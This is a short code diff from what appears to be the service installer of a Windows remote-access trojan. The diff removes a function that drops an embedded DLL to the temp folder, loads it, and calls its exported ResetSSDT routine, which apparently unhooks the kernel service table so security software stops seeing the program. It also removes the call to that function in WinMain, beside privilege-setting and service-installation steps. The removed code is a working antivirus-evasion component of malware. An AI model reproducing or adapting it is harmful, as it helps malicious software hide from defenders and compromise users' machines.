@@ -436,42 +436,6 @@ void StartService(LPCTSTR lpService)
 	}
 }
 
-bool ResetSSDT(HMODULE	hModule)
-{
-	typedef bool (__stdcall * LPResetSSDT)();
-	bool	bRet = true;
-	char	strTmpPath[MAX_PATH];
-	char	strDllPath[MAX_PATH];
-
-	GetTempPath(sizeof(strTmpPath), strTmpPath);
-	GetTempPath(sizeof(strDllPath), strDllPath);
-	wsprintf(strDllPath, "%s\\%d_ex.tmp", strTmpPath, GetTickCount());
-
-	try
-	{
-		ReleaseResource(hModule, IDR_DLL, "BIN", strDllPath, NULL);
-
-		HMODULE	hDll = LoadLibrary(strDllPath);
-		if (hDll == NULL)
-		{
-			throw "";
-		}
-
-		LPResetSSDT	ResetSSDT = (LPResetSSDT)GetProcAddress(hDll, "ResetSSDT");
-		if (ResetSSDT == NULL)
-			throw "";
-		ResetSSDT();
-		FreeLibrary(hDll);
-			
-	}catch(...)
-	{
-		bRet = false;
-		DeleteFile(strDllPath);
-	}
-	
-	return bRet;
-}
-
 int memfind(const char *mem, const char *str, int sizem, int sizes)   
 {   
 	int   da,i,j;   
@@ -578,7 +542,6 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	
 	// 确保权限
 	SetAccessRights();
-	ResetSSDT(hInstance);
 
 	lpServiceName = InstallService(lpServiceDisplayName, lpServiceDescription, lpEncodeString);
 
